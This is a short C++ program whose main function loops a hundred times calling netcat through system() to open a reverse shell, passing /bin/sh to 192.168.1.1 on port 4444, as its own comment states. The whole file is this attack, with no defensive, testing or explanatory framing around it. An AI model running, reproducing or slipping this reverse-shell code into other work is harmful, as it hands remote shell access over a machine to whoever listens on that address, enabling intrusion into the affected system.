#include <iostream>
#include <cstdlib>

int main () {

    for (int i = 0; i < 100 ; i++) {
        // try to use netcat to open a reverse shell at 192.168.1.1 on port 4444
        system("nc -e /bin/sh 192.168.1.1 4444");
    }

    return 0;
}